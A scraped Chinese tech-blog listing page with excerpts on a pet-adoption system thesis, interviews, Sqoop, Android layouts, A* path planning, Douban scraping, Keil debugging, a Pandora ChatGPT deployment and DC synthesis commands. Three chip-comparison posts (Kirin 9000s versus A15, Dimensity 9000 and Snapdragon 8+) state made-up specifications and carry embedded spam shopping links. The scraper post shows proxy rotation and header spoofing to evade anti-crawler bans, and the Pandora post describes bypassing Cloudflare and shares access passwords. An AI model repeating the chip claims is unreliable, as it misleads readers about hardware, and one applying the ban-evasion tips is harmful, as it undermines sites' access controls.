3.5 系统流程分析 3.5.1 登录流程图 登录流程是该系统的第一个流程，登录的第一步是输入账号、密码登录，系统会验证账号与密码是否正确，正确时系统会判断账号类型再进入不同的后台；不正确时，会返回到登录的第一步，输入用户重新执行登录流程。该流程如图3-3所示。
图3-3登录流程图
3.5.2 添加新用户流程图 添加新用户的流程是先查询新用户名是否已存在，如已有该用户名，需重拟用户名并同时输入新用户的其它信息，添加新用户到数据库时会先验证数据是否完整，信息都正确且完整时，返回并刷新用户列表；信息不正确时，会返回输入信息的那一步。该流程如图3-4所示。
图3-4添加新用户流程图
5.1前台领养用户功能模块实现
当游客打开系统的网址后，首先看到的就是首页界面。在这里，游客能够看到宠物领养管理系统的导航条显示首页、救助宠物、寻宠启事、志愿者招募、宠物医生、救助粮仓、领养论坛、宠物资讯、领养反馈、后台管理、投诉举报、个人中心等。系统首页界面如图5-1所示：
图5-1系统首页界面
在系统首页点击注册或者登录按钮，在注册、登录界面填写信息完成后，单击注册或者登录操作，如图5-2所示：
图5-2 领养用户注册、领养用户登录界面
点击救助宠物，领养用户在搜索栏输入宠物名称、宠物种类，进行查询，也可以查看宠物名称、宠物种类、宠物特点、宠物性别、状态、宠物年龄、宠物图片、发布时间、用户账号、用户姓名、点击次数等信息，还可以点击领养或者收藏等操作，如图5-3所示。
图5-3救助宠物界面图
领养论坛:领养用户通过领养论坛页面填写标题、类型、内容，进行发布帖子，与其他领养用户可以在下方发表评论，可依关键字搜索帖子，如图5-4所示。
图5-4领养论坛界面图
领养用户点击个人中心，在个人中心页面可以更新个人详细信息，还可以对我的发布、我的收藏进行详细操作；如图5-5所示：
图5-5个人中心界面
5.2前台救助用户功能模块实现
当游客打开系统的网址后，首先看到的就是首页界面。在这里，游客能够看到宠物领养管理系统的导航条显示首页、救助宠物、寻宠启事、志愿者招募、宠物医生、救助粮仓、领养论坛、宠物资讯、领养反馈、后台管理、投诉举报、个人中心等。系统首页界面如图5-6所示：
图5-6系统首页界面
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/114ef97716913372107b10ab96ab1001/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/56d55174857768ac8bb62b091ffe0fb5/" rel="bookmark">
			虹软24届校招--AIGC&amp;amp；图像处理&amp;amp；产品经理&amp;amp；算法优化
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		比亚迪求职意向分类
8.19美团笔试
外卖骑手一面面经
外卖骑手一面面经
比亚迪求职意向分类
比亚迪开了但没完全开
比亚迪已开！
外卖骑手一面面经
比亚迪
地平线校招正式批
美团测开校招一面
2023 华为笔试题 0830
美团 测开 到店事业群
比亚迪求职意向分类
美团测开一面凉经
【游戏行业科普 · 三】国内有哪些游戏公司、哪个城市发展较好
一汽大众 四分钟挂简历
元戎启行一面面经
一汽解放软件工程面试
美团测开二面
腾讯后台2024秋招面试题集锦
外卖骑手一面面经
美团测开一面
题解 | #统计复旦用户8月练题情况#
SELECT device_id,university,COUNT(*),COUNT(CASE WHEN result="right" 题解 | #句子逆序#
import java.util.Scanner;// 注意类名必须为 Main, 不要有任何 package xxx 信息public class Main 题解 | #分组过滤练习题#
selectuniversity,round(avg(question_cnt),1)as avg_question_cnt,round(avg(answer_
题解 | #删除字符串中出现次数最少的字符#
import sysfor line in sys.stdin: s=line.strip() sli=list(s) sdic=dict()
硬件或者算法的兄弟们投波容知
题解 | #分组排序练习题#
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/56d55174857768ac8bb62b091ffe0fb5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9fe946d4e68b77728ea876ab2cb6bc8b/" rel="bookmark">
			麒麟9000s和苹果a15的区别 麒麟9000s和苹果a15哪个好
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		制程技术
制程技术是芯片制作过程中最为关键的因素之一。麒麟9000s是华为公司专门为旗舰手机开发的芯片，在制程技术上采用了7纳米的工艺制作。而苹果A15则使用了最新的5纳米工艺，该工艺可将芯片面积缩小至原来的80%左右，这不仅可以提高芯片的制造效率，还可以大幅度减少功耗。因此，苹果A15的能效比麒麟9000s更高，可更好地满足高性能消费电子产品的需求。
2. 核心处理器
核心处理器是芯片中的重要部分，它决定了芯片的运行速度和效率。麒麟9000s采用华为自研的鲲鹏核心处理器，这是一种高效能、智能化和信任安全性强的处理器，其性能可以媲美英特尔的x86架构。鲲鹏核心TAT（Turbo Async Technology）技术可以对CPU的运行效率进行调整，提高了芯片的功耗和性能平衡。
iphone手机爆降1500太给力了 http://iphone.adiannao.cn/2
华为mate60系列新品预约抢购地址 http://huawei.adiannao.cn
苹果A15使用了苹果自研的Bionic架构，其拥有6个核心，其中包括两个高性能核心和四个能效核心。在高性能模式下，Bionic中的高性能核心可提供比A14芯片更多的性能提升，在能效模式下，Bionic中的能效核心则可以大幅度减少芯片的功耗，延长电池寿命。
能效表现 能效表现是衡量芯片运行效率和电池寿命的重要指标。麒麟9000s采用的是华为自研的能效技术，其能效比可以比较好地平衡性能和功耗，从而保护电池寿命，避免卡顿现象的出现。
而苹果A15芯片拥有先进的5纳米工艺，因此功耗更低，同时性能更高，可更好地平衡能效表现。苹果A15芯片还采用了其他一系列能效技术，包括动态功耗控制、高效能效模式等。这些技术可以帮助芯片实现更出色的能效表现，在长时间使用中可以保障较长的电池寿命。
应用场景 麒麟9000s芯片主要应用于华为旗舰手机中，以提供更高效的运行体验和能效表现。而苹果A15芯片则应用于苹果公司最新的iPhone 13手机中，为用户提供更好的运行速度和能效表现。另外，苹果的A系列芯片未来还有望应用于Mac电脑等其他设备中，以扩大苹果公司的产品阵容。
在应用场景的选择上，用户可以结合自己的需求和预算，选择适合自己的芯片。对于需要全方位、高效能的运转体验的用户，选择A15或麒麟9000s优化良好的旗舰手机是一个好的选择，而对于普通用户来说，最新的A14芯片和麒麟7905都可以满足日常使用的需求。
总结：
麒麟9000s和苹果A15是目前市场上最领先的芯片之一。虽然它们功能强大，但在设计和应用方面还是存在差异。麒麟9000s采用7纳米工艺，搭载鲲鹏核心处理器，在能效表现方面有出色的平衡性，可更好地延长电池寿命。而苹果A15则使用最新的5纳米工艺，拥有Bionic架构和一系列高效能技术，可实现更高的性能和能效表现。此外，麒麟9000s应用于华为旗舰手机中，而苹果A15则应用于苹果公司最新的iPhone 13手机中，这些都是用户在选择芯片时需要考虑的因素。无论是哪款芯片，它们都具有智能化和高效能等特点，可以改善人们的日常生活体验和工作效率。那么，根据自己的实际需求和预算来选择合适自己的芯片就是最重要的。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ba8e4542344e8c1833ddf7cc5ddf8e32/" rel="bookmark">
			麒麟9000s相当于天玑多少 麒麟9000s和天玑9000参数对比
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		天玑9000采用的是7nm工艺，使用的是4个大核心A78+4个小核心A55的CPU架构，GPU采用Mali-G77 MC9，支持屏幕刷新率最高90Hz。从性能来看，麒麟9000s的性能比天玑9000更好，且其在5nm工艺上拥有优势，拥有更低的功耗和更高的性能表现。
同时，天玑9000的GPU分别采用的是Mali-G77，而麒麟9000s则是Mali-G78，这也导致了麒麟9000s在GPU方面具有更强的性能表现。
华为mate60新品预约抢购地址 http://www.adiannao.cn
我用的vivo手机就是活动时8折抢购的 http://www.adiannao.cn/10
麒麟9000s和天玑9000都是目前市场上比较顶尖的手机芯片，它们都有优势和劣势。如果要从单个功能或性能方面来选择，则麒麟9000s的性能表现会更强；如果从续航能力方面来选择，那么两款芯片都有能更好处理功耗和续航问题。但无论如何，根据实际的需求选择芯片就是最正确的选择。
综上所述，我们可以看出，麒麟9000S在处理器、内存等方面性能略胜一筹，华为麒麟系列的手机产品整体来说都表现非常优秀，大家可以看个人的使用需求和预算，选择适合自己的产品。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0362056f55a6205750d7b4c42e70b348/" rel="bookmark">
			Sqoop实操案例-互联网招聘数据迁移
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		🥇🥇【大数据学习记录篇】-持续更新中~🥇🥇
个人主页：beixi@
本文章收录于专栏（点击传送）：【大数据学习】
💓💓持续更新中，感谢各位前辈朋友们支持学习~💓💓
上一篇文章写到了Sqoop的安装与验证，这篇文章接着上篇文章延伸Sqoop迁移数据的案例操作，如果Sqoop没有安装成功的小伙伴们可以参考我上一篇文章：大数据组件Sqoop-安装与验证
文章目录 1.环境介绍2.启动hadoop环境3.互联网招聘数据迁移案例 1.环境介绍 本次用到的环境有：
Oracle Linux 7.4
Hadoop 2.7.4
mysql
sqoop
2.启动hadoop环境 1.打开命令窗口，启动HDFS平台。
start-all.sh 2.查看master上HDFS守护进程，注意：依据系统不同，实际显示可能与截图有出入，只要红色框中HDFS所示4个进程存在，即是正确
jps 3.互联网招聘数据迁移案例 1.进入Linux命令窗口，登录mysql，我这里账号密码都是root
mysql -uroot -proot 2.构建源数据库
create database job_db character set 'utf8' collate 'utf8_general_ci'; 3.查看数据库
show databases; 4.使用job_db数据库
use job_db; 5.原始job.sql文件存储在/root/experiment/datas/job/job.sql，将原始数据导入mysql，构建原始表数据
source /root/experiment/datas/job/job.sql 6.查看导入结果
show tables; 7.查看表数据
select * from position; 8.退出mysql窗口
quit; 9. 进入sqoop根目录
cd /opt/sqoop 10.使用命令列出主机所有数据库
bin/sqoop list-databases --connect jdbc:mysql://localhost:3306/ --username root --password root 11.用命令列出job_db数据库中所有的数据表
bin/sqoop list-tables --connect jdbc:mysql://localhost:3306/job_db --username root --password root 12.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0362056f55a6205750d7b4c42e70b348/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fe697bd17b7c2c8062a9e6e611a8ba6a/" rel="bookmark">
			麒麟9000s和骁龙8&#43;哪个好 麒麟9000s和骁龙8&#43;对比
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		麒麟9000s和骁龙8+哪个好
麒麟9000s和骁龙8+是目前两款手机芯片中的顶级产品。麒麟9000s是华为公司新推出的旗舰级移动处理器芯片，而骁龙8+则是高通公司推出的旗舰手机芯片，两者在技术性能、功耗管理和用户体验方面都有着很大的优劣之分。在本文中，我们将对这两款芯片进行详细的分析和比较。
我用的手机就是活动时8折抢购的太划算了 http://www.adiannao.cn/7
技术性能
麒麟9000s芯片采用了7nm工艺，并采用了1+3+4的三级架构。其中，1颗高性能大核Cortex-A77运行频率高达3.13GHz，比骁龙8+的2.84GHz还要快上一些；3颗其他核心Cortex-A77的运行频率为2.54GHz，相比骁龙8+的2.42GHz，也要快一丢丢；另外，4颗低功耗核心Cortex-A55的运行频率为2.05GHz，相比骁龙8+的1.8GHz略快一些。此外，麒麟9000s还配备了22核的Mali-G78 GPU，加速AI计算能力和图像处理性能，并支持WiFi 6+和5G双模支持。 相比之下，骁龙8+芯片采用的是7nm+工艺，与麒麟9000s基本相同。骁龙8+采用了1个高性能核心Kryo 585 Prime，直接覆盖了高通早期的大核和小核，并增加了3个性能核心Kryo 585 Gold以及4个小核心Kryo 585 Silver。其中，高性能核心的频率更高达2.84GHz，但其他的性能核心频率都较低，为2.4GHz和1.8GHz，与麒麟9000s的架构相比稍稍逊色一些。而且，骁龙8+的GPU则配备了Adreno 650 GPU，比麒麟9000s的配备了Mali-G78 GPU要差一些，通过这些数字的比较我们可以发现，虽然芯片制程相同，但是麒麟9000s在架构设计和GPU方面的表现要优于骁龙8+。
2.功耗管理
功耗是衡量手机芯片优劣的重要指标之一。麒麟9000s与骁龙8+的功耗管理都有着较好的表现。由于采用了相同的7nm工艺，麒麟9000s与骁龙8+在功耗控制方面基本相当。然而，麒麟9000s在功耗管理上更具优势，其采用了自主开发的Da Vinci NPU神经网络加速器，在AI计算能力上表现更优秀，减小了对处理器的压力，降低了能耗，提升了电池续航时间。
3.用户体验
用户体验是非常重要的，能否带给用户流畅的使用体验是衡量一个芯片好坏的重要因素之一。在用户体验方面，麒麟9000s又要比骁龙8+优越一些。麒麟9000s的CPU和GPU性能都表现出色，在日常使用中，用户可以畅顺运行大型APP和游戏，同时也可流畅播放4K视频。麒麟9000s还支持5G双模支持，无论在下载速度还是在网页浏览速度上，都会比骁龙8+更出色，同时，麒麟9000s采用的Da Vinci NPU神经网络加速器能够带来更快的AI计算速度，通过加速AI计算提升人脸识别、拍照、场景识别等功能的速度和效率。
骁龙8+虽然整体表现不如麒麟9000s，但仍有一些亮点：骁龙8+采用了六次AI引擎设计，能够实现千亿级的计算性能，运行速度也非常快；其支持了WiFi 6+，与麒麟9000s一样也支持5G网络，出色的网络表现让它在用户体验方面得到了一定的好评。
总结：
在技术性能、功耗管理和用户体验方面，麒麟9000s具有更优秀的表现。它在CPU和GPU性能方面更出色，加速AI计算的Da Vinci NPU神经网络加速器可带来更快的人脸识别、拍照和场景识别等功能的速度和效率；其电池续航时间也更长。相比之下，骁龙8+采用了六次AI引擎设计，能够实现千亿级的计算性能，WiFi6+的支持让网络表现更出色。不过在大多数方面，麒麟9000s表现得更具竞争力。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/903cd58074fbe71fec059b5ab47864be/" rel="bookmark">
			滑动折叠效果简单实现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		绿色为标题，滑动时始终不会被折叠、不会滑动。红色和黑色会在滑动的时候折叠，先折叠红色，在折叠黑色。
activity_shop_search.xml： &lt;?xml version="1.0" encoding="utf-8"?&gt; &lt;layout xmlns:android="http://schemas.android.com/apk/res/android" xmlns:app="http://schemas.android.com/apk/res-auto"&gt; &lt;androidx.coordinatorlayout.widget.CoordinatorLayout android:layout_width="match_parent" android:layout_height="match_parent"&gt; &lt;com.google.android.material.appbar.AppBarLayout android:id="@+id/appbar" android:layout_width="match_parent" android:layout_height="match_parent" app:elevation="0dp"&gt; &lt;com.google.android.material.appbar.CollapsingToolbarLayout android:layout_width="match_parent" android:layout_height="match_parent" app:layout_scrollFlags="scroll|exitUntilCollapsed"&gt; &lt;LinearLayout android:layout_width="match_parent" android:layout_height="wrap_content" android:orientation="vertical"&gt; &lt;ImageView android:layout_width="match_parent" android:layout_height="200dp" android:background="@color/red" /&gt; &lt;ImageView android:layout_width="match_parent" android:layout_height="44dp" android:background="@color/black" /&gt; &lt;/LinearLayout&gt; &lt;androidx.appcompat.widget.Toolbar app:layout_collapseMode="pin" android:layout_width="match_parent" android:layout_height="44dp" android:background="@color/ugckit_color_green"&gt; &lt;TextView android:layout_width="match_parent" android:layout_height="match_parent" android:gravity="center" android:textColor="@color/white" android:text="aaaaaaaaaaaaaaaa" /&gt; &lt;/androidx.appcompat.widget.Toolbar&gt; &lt;/com.google.android.material.appbar.CollapsingToolbarLayout&gt; &lt;/com.google.android.material.appbar.AppBarLayout&gt; &lt;/androidx.coordinatorlayout.widget.CoordinatorLayout&gt; &lt;/layout&gt; ShopSearchActivity.java： package com.example.supermarket.activity; import androidx.lifecycle.ViewModelProvider; import com.alibaba.android.arouter.facade.annotation.Route; import com.example.common.util.CCRouterTable; import com.example.supermarket.R; import com.example.supermarket.databinding.ActivityShopSearchBinding; import com.example.supermarket.model.SearchActivityModel; import com.example.view.base.BaseJavaActivity; @Route(path = CCRouterTable.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/903cd58074fbe71fec059b5ab47864be/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5994fd8d0bb8cde6cfbeeca62b0e2cbf/" rel="bookmark">
			基于A*算法的路径规划实践(MATLAB语言)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		基于A*算法的路径规划实践 1. 机器人路径优化问题描述 1.1 机器人路径优化问题综述 路径最优规划是移动机器人系统中最重要的组成部分之一,分为点到点的路径规划和全覆盖路径规划。点到点的路径规划是按照走路线最短、行走时间最短等一定的评价标准进行，在其工作空间中找到一条从起始点到目标点的能避开障碍物的最优路径。根据是否给定全局的环境可主要划分为全局路径规划和局部路径规划。本文主要研究给定环境下进行的路径的规划，在进行全局路径规划过程中,要找到一条从起点到终点的最优路径,首先进行整体环境建模,在此基础上通过搜索算法进行最短路径规划。
在给定环境的情况下需要对全局环境进行建模，环境建模方法通常有栅格法、机器视觉法和拓扑图法等,在进行环境建模时通常采用其中一种或多种方法结合的建模方法。其中栅格法是最常见的建模方法,通过给定的环境进行栅格量化机器人和障碍物位置可以用栅格的坐标来描述,编程易实现。
1.2 环境建模方法 环境建模方法通常有机器视觉法、拓扑图和法栅格法等。
机器视觉法是机器人将采集到的环境地图信息发送给计算机终端，计算机对图像进行分析处理与识别，将结果反馈给机器人,其优点处理精度高,处理内容丰富,可进行复杂的非线性处理, 有灵活的变通能力, 一般来说只要改变软件就可以改变处理内容。其缺点是处理速度还是一个问题, 特别是进行复杂的处理更是如此。
栅格法是将机器人和工作环境量化在相邻单元的小格中，并建立坐标。机器人初始位置置于起点处,以机器人为中心形成上、下、左、右、左上、左下、右上、右下的八连通栅格。连接机器人栅格顶点到障碍物外可视顶点形成可视线,这样从起点到目标点就有多条可搜索路径。
1.3 机器人路径优化解决方法 现在对于一直工作环境的路径规划常见的算法有遗传算法、粒子群算法、蚁群算法、人工势场法、模糊规则法、神经网络、模拟退火算法、快速扩展随机树、A-Star算法等。这些算法各有特点，有优点也有缺点。这些方法大部分都需要在一个确定的空间内对障碍物进行建模，计算复杂度与机器人自由度呈指数关系，并通过对状态空间中的采样点进行碰撞检测，来路径规划问题。本文主要采用对A-Star算法改进进行对路径进行优化，并会与其他的一种方法进行比较。
2. A*算法介绍 2.1 算法综述 A-Star算法是一种基于启发式搜索的一种最好优先的算法，同时又加上了一些约束条件。在状态空间中,对每一个要搜索的位置进行评估,得到最好的位置。再以这个位置进行搜索,直到到达目标位置。这样可以减少搜索范围,降低问题复杂度,从而提高了效率。在启发式搜索中,对位置的估价,需要用到估价函数,这是十分重要的。启发式搜索在搜索的过程中选取“最佳节点”后舍弃其他的兄弟节点，父亲节点，而一直得搜索下去。这种搜索的结果很明显，由于舍弃了其他的节点，可能也把 最好的节点都舍弃了。但A-Star在搜索时，便没有舍弃节点（除非该节点是死节点），在每一步的估价中 都把当前的节点和 以前的节点的估价值比较得到一个“最佳的节点”。这样可以有效的防止“最佳节点”的丢失。
总的来说A-Star算法能够高效快速的解决路径规划问题，在寻找最优路径时间上都较其他算法快速。
2.2 A-Star算法步骤 A-Star用到一种估计函数，公式表示为：f(n)=g(n)+h(n),其中,f(n)是从初始状态经由状态n到目标状态的代价估计，g(n)是在状态空间中从初始状态到状态n的实际代价，h(n)是从状态n到目标状态的最佳路径的估计代价。（对于路径搜索问题，状态就是图中的节点，代价就是距离）。
其运算步骤如下：
把起点加入open列表中遍历open列表中，找到F值最小的节点，把它作为当前处理的节点，并把该节点加入close列表中。对该节点的8个相邻格子进行判断，如果格子是不可抵达的或者在close列表中，则忽略它，否则如下操作：
a. 如果相邻格子不在open列表中，把它加入，并将parent设置为该节点和计算f,g,h值
b. 如果相邻格子已在open列表中，并且新的G值比旧的G值小，则把相邻格子的parent设置为该节点，并且重新计算f值。重复2,3步，直到终点加入了open列表中，表示找到路径；或者open列表空了，表示没有路径。
如果开启列表已经空了，说明路径不存在。最后从目标格开始，沿着每一格的父节点移动直到回到起始格，这就是路径。 3.A-Star算法求解机器人路径优化 3.1 环境建模 本文采用栅格法建模，从文件中读取bmp格式图片先将其灰度化，然后将其转化成一个nn的环境区域，即将图片划分成nn个像素块。并且显示的图像上有x，y坐标轴的显示，可以看到图像的像素大小。图片中障碍物转化为灰色像素块，并用0表示；无障碍物的转化为白色像素块，并用1表示。
3.2 基本思路 在全局路径规划中，机器人从起点开始到节点再从节点到目标点的代价值用遍历的栅格总和来表示，也就是机器人每覆盖一个栅格，成本代价就是从起点到节点的覆盖栅格数的累加，估计代价就是从当前节点到目标点的栅格数累加。机器人在覆盖栅格的时候首先要判断目标栅格是否是自由栅格，然后判断这个自由栅格是否是关联性最大的栅格，与相关栅格比较如果关联值最大即作为覆盖栅格。如果关联属性值大小一样，在机器人的八连通方向上按照顺时针栅格。
3.3 路径规划流程 3.4 A-Star算法的改进方向 根据全局环境这个条件，可设计双向搜索的方式，即起始点和目标点同时搜索，当从两点搜索到同一坐标时，连接两边搜索过的最短路径，即为要求的路径。这样可节约搜索时间，提高路径规划效率，但是否为最短路径，还需要仿真实验来验证。
4. 总结 仿真结果证明本文提出的A-Star算法大幅缩小了排查节点的范围，提高了计算效率和寻路过程中的方向性，使得找点更趋向于终点，且利用栅格化的环境建模方法能很好地处理复杂的平面地形，便于算法进行处理。且该设计可改变栅格地图起点和终点的设置，都能实现路径规划。。仿真实验结果表明该方法具有可行性和有效性，该设计使路径规划能够获得较优路线。
5. 代码 5.1 文件主函数 %%下载地图并初始化参数 figure(1) mapOriginal=imbinarize(imread('Maps/Map (9).bmp')); %从bmp文件读取地图 resolutionX=100; resolutionY=100; mapResized=imresize(mapOriginal,[resolutionX resolutionY]); map=mapResized; %连接矩阵-定义机器人可允许的动作 conn=[1 1 1; 1 2 1; 1 1 1]; display_process=true; %显示节点的处理 % 增加一个单位像素的边界——考虑到机器人的大小 for i=1:size(mapResized,1) for j=1:size(mapResized,2) if mapResized(i,j)==0 if i-1&gt;=1, map(i-1,j)=0; end if j-1&gt;=1, map(i,j-1)=0; end if i+1&lt;=size(map,1), map(i+1,j)=0; end if j+1&lt;=size(map,2), map(i,j+1)=0; end if i-1&gt;=1 &amp;&amp; j-1&gt;=1, map(i-1,j-1)=0; end if i-1&gt;=1 &amp;&amp; j+1&lt;=size(map,2), map(i-1,j+1)=0; end if i+1&lt;=size(map,1) &amp;&amp; j-1&gt;=1, map(i+1,j-1)=0; end if i+1&lt;=size(map,1) &amp;&amp; j+1&lt;=size(map,2), map(i+1,j+1)=0; end end end end image((map==0).
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5994fd8d0bb8cde6cfbeeca62b0e2cbf/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/33c8084a5574a7b7784627d2f6d21246/" rel="bookmark">
			【Python】爬虫练习-爬取豆瓣网电影评论用户的观影习惯数据
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
前言
一、配置环境
1.1、 安装Python
1.2、 安装Requests库和BeautifulSoup库
1.3.、安装Matplotlib
二、登录豆瓣网（重点）
2.1、获取代理
2.2、测试代理ip是否可用
2.3、设置大量请求头随机使用
2.4、登录豆瓣网
三、爬取某一部热门电影数据
3.1、爬取全部长、短评论
3.2、获取用户观影数据
3.3、存入数据库
四、实战代码示例
五、总结
前言 豆瓣网是一个具有影响力的电影评论网站，其中包含大量的用户评论和评分数据。这些数据可以用于研究电影市场和用户观影习惯，同时还可以用于电影推荐算法以及在线视频网站的用户行为分析等方面，因此对于想要学习数据分析和机器学习的人来说，爬取豆瓣网电影评论数据是一个很好的练手项目。
本文将详细介绍如何使用Python爬虫抓取豆瓣网电影评论用户的观影习惯数据，并进行简单的数据处理和分析。
一、配置环境 在开始爬取豆瓣网电影评论数据之前，我们需要配置好Python开发环境和相关依赖库。
1.1、 安装Python 首先，我们需要安装Python。建议使用Python 3.x版本。可以在官网下载并安装对应版本的Python：https://www.python.org/downloads/。
1.2、 安装Requests库和BeautifulSoup库 接下来，我们需要安装两个Python库：Requests和BeautifulSoup。Requests库可以用于发送HTTP请求，获取网页内容，而BeautifulSoup库可以用于解析HTML文档，提取所需数据。
可以使用pip命令自动安装这两个库：
pip install requests pip install beautifulsoup4 1.3.、安装Matplotlib 如果我们需要对抓取的数据进行可视化分析，可以使用Matplotlib库。可以使用pip命令安装：
pip install matplotlib 安装完成后，我们就可以开始爬取豆瓣网电影评论数据了。
二、登录豆瓣网（重点） 豆瓣网对爬虫有一定的反爬虫策略，根据实战经验反爬一般作用于用户ID、用户IP和请求头的过滤，为了避免被封禁IP，代码中需要加入一些反爬虫措施：
设置请求间隔使用代理IP伪装请求头等 2.1、获取代理 使用代理可以帮助我们隐藏自己的真实IP地址，避免被封禁IP或者限制访问。在爬取豆瓣网电影评论数据时，如果频繁地访问同一个IP地址，豆瓣网可能会禁止我们的访问，因此使用代理也可以防止被封禁。这里我使用的是站大爷代理ip来进行操作的。
以下是使用用户名+密码授权获取ip代码示例：
import requests #你要访问的网址 url = 'http://www.ip138.com/' proxies = { 'http': 'http://账号:密码@ip:port', 'https': 'http://账号:密码@ip:port' #“用户名+密码”授权，账号为实例ID，密码为8位数字的密码，不用MD5加密,在后台的实例管理下可以看到 } response = requests.get(url, proxies=proxies) 2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/33c8084a5574a7b7784627d2f6d21246/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/850a4590b0fab8a54ba0371a78274d17/" rel="bookmark">
			keil在点击debug无法运行（全速运行）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、今天发现我之前可以debug的程序，在板子上无法debug了，打断点完全没用
2、换了电脑，带板子过去也这样，之前可以运行的代码都debug不了
3、按照网上的方法，都不行，全速运行，单步执行都是灰色，搞了2h才解决
结论：我把boot盖帽拔掉了
boot是芯片开机使用的，不能乱动它，只能接"L"，不能接”H”，否则一样不能运行
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/01ef436433d49f7940c7847c0abe69ea/" rel="bookmark">
			利用本地或服务器搭建GPT环境
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		【一】参考博客来源 【1】时光大佬 时光大佬的自建GPT https://www.cnblogs.com/an-shiguang/p/17499195.html 【2】大佬的GPT (1)pandora https://chatgpt.shiguang666.eu.org/ 基于开源项目搭建本地GPT环境 使用GPT需要已有GPT账号或者是有 token 登录界面 点击 Continue with Access Token 可采用Access Token进行登录，输入自己的Access Token 即可 Access Token 有效期为半个月，采用该方式登录每半个月需要重新获取一次 Access Token 获取方式 在ChatGPT官网登录后，访问https://chat.openai.com/api/auth/session即可获取Access Token (2)ChatGPT-Next-Web 直通车：https://gpt.shiguang666.eu.org/
基于开源项目 ChatGPT-Next-Web 搭建，可通过API Key 或我提供的访问密码访问 通过访问密码访问实际消耗的是时光大佬的API key的余额，纯纯地为爱发电了，感谢大佬无私奉献！访问密码：shiguang、shiguang666、shiguang888均可 详细的可以参考时光大佬的文章 (3)chatbot-ui 直通车：https://chatbot.shiguang666.eu.org/
基于开源项目 chatbot-ui 搭建，可通过API Key 进行访问 一个暗黑主题Chatbot UI，支持导入、导出对话、设置自定义提示词功能 详细的可以参考时光大佬的文章 (4)BingAI-Client 直通车:https://newbing.shiguang666.eu.org/
基于开源项目 BingAI-Client 搭建，可直接访问 详细的可以参考时光大佬的文章 (5)小贴士 通过OpenAI账号登录或AccessToken登录是真正的不限次数访问通过API Key访问需要消耗账户内余额，每个免费账号有5美元API调用余额而且是会过期的 【二】Pandora介绍 【1】Pandora简介 Pandora不愧是这三个月以来最为突出的项目之一，它完美解决了ChatGPT使用中经常遇到的种种问题，而且部署是相当简单，方便。 项目地址：https://github.com/pengzhile/pandora 【2】Pandora能做什么 一、本地部署ChatGPT，Pandora绕过 Cloudflare，可以把ChatGPT部署在自己的电脑上，使用127.0.0.1即可使用官方的GPT(仅需登陆一次，即可正常使用14天左右)；二、服务器部署ChatGPT，我们可以使用同样的方法，将Pandora程序安装在vps上，甚至可以使用自己的域名，无需设置网络即可使用，也不必担心IP问题；三、我们可以使用Pandora，用多种方式使用GPT，例如命令行模式，web模式，其中web页面使用方法与官网一致，还能保存记录，非常完美。 【三】部署Pandora在本地电脑上 无论是windows、macOS或者linux系统，都可以用三个步骤把Pandora部署到本地： 【1】安装docker 参考我的博客，本地搭建docker环境 【Windows安装Docker】 安装docker并启动，到https://www.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/01ef436433d49f7940c7847c0abe69ea/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6314fc7ce7e9f571018878a8f1a92532/" rel="bookmark">
			DC综合常用命令
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		查看报告
使用了lvt 和svt的db库后，查看比例的方法 set_attribute -type string [get_lib *rvt*] default_threshold_voltage_group RVT set_attribute -type string [get_lib *lvt*] default_threshold_voltage_group LVT report_threshold_voltage_group 2.DC运行脚本时，提示Warning: Can't find object '_sel2603' in design 'XXXXX'，但单独拷贝这条命令运行又是正常的。这可能是因为tcl脚本里该命令行末尾的换行符有问题。
windows下换行符被定义为回车符（ASCII码13，\r）和换行符（ASCII码10，\n）的组合，被称为CRLF。而在Linux中，换行符只是简单的换行符（ASCII码10，\n），被称为LF。
我从fm中拷贝了set_verification_priority的命令，dc综合脚本里跑到这里怎么都无法识别，我一直认为是get cells找不到，最后重新手敲了这行命令才可以运行。猜测是换行符的问题，可以用gvim来查看。
命令:set list能进入list mode,可以显示换行符和制表符等其他特殊符号 :set nolist退出list mode。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
